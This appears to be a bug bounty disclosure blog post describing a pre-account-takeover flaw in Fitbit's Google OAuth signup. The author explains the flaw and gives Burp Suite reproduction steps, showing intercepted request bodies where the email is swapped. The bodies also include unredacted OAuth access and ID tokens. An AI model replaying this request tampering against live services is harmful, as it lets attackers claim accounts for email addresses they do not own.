+++
title = " Unauthorization of Oauth Token Leads to Pre Account Takeover without Verifying"
date = "2022-03-08"
author = "0xdroopy"


+++

## Summary 

On Fitbit official website I was able to register with any account without verifying the email because of the vulnerability Broken Authentication. This was due to the unauthorization of the Oauth token with respect to the email address which was being transferred to the server.

{{< image src="https://miro.medium.com/max/1400/1*3z3zxJj_GzArgT2SIy529w.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

## Functionalities
On fitbit.com there are 2 functionalities to register in the account. One is normal functionality of email address and password whereas other is the functionality of Oauth by which you can register using your google account. In the Oauth functionality, after logging through you would be directly be logged in to the account. Whereas in the normal functionality, you have to verify the email in order to go for further registration of details.
  
### Functionalities On Register Page
{{< image src="https://keepcodeclean.com/wp-content/uploads/2020/06/oauth.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

### When Try to Register Using Normal Functionality
{{< image src="https://keepcodeclean.com/wp-content/uploads/2020/06/oauth.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

## The Unauthorization of Oauth Token

By logging through the Oauth Functionality, accounts.google.com sends the Oauth Token to the website who requested to be logged in using Google Functionality. Then the website authorize the token and thus extracts the email address fromit. The authorization of the Oauth Token and the Email Address go step by step till the end of the registration of the account. At the end the server uses the cookies same as the oauth token being provided for further logins.

{{< image src="https://keepcodeclean.com/wp-content/uploads/2020/06/oauth.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

## Steps To Reproduce

1) Make Two New Google Accounts and name them as Account 1 and Account 2.

2) Go to https://accounts.fitbit.com/signup and now login with the Account 1 using Google Oauth Functionality.

3) Now after clicking next put your height , weight etc. and Start intercepting the requests.

4) After that Click Submit and in the burp suite change the email address from Account 1 to Account 2.
```json
email=testemailaddressforfit1%40gmail.com&password=asuidahsdhaw&birthday=2006-03-08&emailSubscribe=true&firstName=Test&lastName=Account&gender=MALE&height=185.42&heightUnit=en_US&weight=65&weightUnit=METRIC&locale=en_US&localeLang=en&localeCountry=United+States&timezone=Asia%2FKolkata&legalTermsAccepted=true&googleUID=107045151452751939515&googleAccessToken=ya29.A0ARrdaM8eNFf87_O5ah4jQzQLQl8J7Guj7lcAvJul7Sae0OAAniUF-OSCYN4dbXNeLFxMNk-8EyfhbdiT9BlbIgujPCDPK3qqq0nWNjg_IUuEjAmTQgyZpdk6MQQsVzeTHEugRxsqFxjmXi8OEvxiC1bkOr4y&googleIdToken=eyJhbGciOiJSUzI1NiIsImtpZCI6ImQ2M2RiZTczYWFkODhjODU0ZGUwZDhkNmMwMTRjMzZkYzI1YzQyOTIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJhY2NvdW50cy5nb29nbGUuY29tIiwiYXpwIjoiNjI1NTg1NTMyODc3LW01dGgyMjEzZG5xcTZwNzIyZXNxN2hia2F2cmxpOXNkLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiYXVkIjoiNjI1NTg1NTMyODc3LW01dGgyMjEzZG5xcTZwNzIyZXNxN2hia2F2cmxpOXNkLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwic3ViIjoiMTA3MDQ1MTUxNDUyNzUxOTM5NTE1IiwiZW1haWwiOiJ0ZXN0ZW1haWxhZGRyZXNzZm9yZml0MUBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXRfaGFzaCI6IlpyQ2YyR09ZSVM3MENxVGszRlE1TkEiLCJpYXQiOjE2NDY3NDUzMDQsImV4cCI6MTY0Njc0ODkwNH0.qipJa4CC2UDuR8hzW0mIRtJ1-w3xPXZlY_UriCsCK86PcjrZYQ0O3W3FjXYYCel-Vv2LZg_20Qa7sb1vVgy5lceQR7QnUSWBMZoCUEkqaXfTZ8NAyF_Bm3inneDJRkLPuQxwJQRbA0PCqUew7b-Z2OZ10KeqzJqalYstjkAJMXnbd_UTwGdx8d8cdQxJ3dni-5boPvejaoj2qkOzriUYaqrQNZN3Z-UrE_5dV8ux98zAK8ejK3BRquZ0mPWpf_p48QrMYKec7QLahH4rDE1wq4tdQPJz5EZLtcEAwx9IlNKijzjyhKPSdNjRn7zlPxPL5Pqcf7e99gToq5Bjr0GK3w&client_id=228TQF
```

To -
```json
email=testemailaddressforfit2%40gmail.com&password=asuidahsdhaw&birthday=2006-03-08&emailSubscribe=true&firstName=Test&lastName=Account&gender=MALE&height=185.42&heightUnit=en_US&weight=65&weightUnit=METRIC&locale=en_US&localeLang=en&localeCountry=United+States&timezone=Asia%2FKolkata&legalTermsAccepted=true&googleUID=107045151452751939515&googleAccessToken=ya29.A0ARrdaM8eNFf87_O5ah4jQzQLQl8J7Guj7lcAvJul7Sae0OAAniUF-OSCYN4dbXNeLFxMNk-8EyfhbdiT9BlbIgujPCDPK3qqq0nWNjg_IUuEjAmTQgyZpdk6MQQsVzeTHEugRxsqFxjmXi8OEvxiC1bkOr4y&googleIdToken=eyJhbGciOiJSUzI1NiIsImtpZCI6ImQ2M2RiZTczYWFkODhjODU0ZGUwZDhkNmMwMTRjMzZkYzI1YzQyOTIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJhY2NvdW50cy5nb29nbGUuY29tIiwiYXpwIjoiNjI1NTg1NTMyODc3LW01dGgyMjEzZG5xcTZwNzIyZXNxN2hia2F2cmxpOXNkLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiYXVkIjoiNjI1NTg1NTMyODc3LW01dGgyMjEzZG5xcTZwNzIyZXNxN2hia2F2cmxpOXNkLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwic3ViIjoiMTA3MDQ1MTUxNDUyNzUxOTM5NTE1IiwiZW1haWwiOiJ0ZXN0ZW1haWxhZGRyZXNzZm9yZml0MUBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXRfaGFzaCI6IlpyQ2YyR09ZSVM3MENxVGszRlE1TkEiLCJpYXQiOjE2NDY3NDUzMDQsImV4cCI6MTY0Njc0ODkwNH0.qipJa4CC2UDuR8hzW0mIRtJ1-w3xPXZlY_UriCsCK86PcjrZYQ0O3W3FjXYYCel-Vv2LZg_20Qa7sb1vVgy5lceQR7QnUSWBMZoCUEkqaXfTZ8NAyF_Bm3inneDJRkLPuQxwJQRbA0PCqUew7b-Z2OZ10KeqzJqalYstjkAJMXnbd_UTwGdx8d8cdQxJ3dni-5boPvejaoj2qkOzriUYaqrQNZN3Z-UrE_5dV8ux98zAK8ejK3BRquZ0mPWpf_p48QrMYKec7QLahH4rDE1wq4tdQPJz5EZLtcEAwx9IlNKijzjyhKPSdNjRn7zlPxPL5Pqcf7e99gToq5Bjr0GK3w&client_id=228TQF
```

5) After Forwarding the request , you would be successfully signed up with the Account 2 Email address without verifying.

{{< image src="https://keepcodeclean.com/wp-content/uploads/2020/06/oauth.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

 
## Demonstration

{{<iframe width="420" height="315"
src="https://www.youtube.com/embed/DjbVqwm3DtI">
</iframe>}}
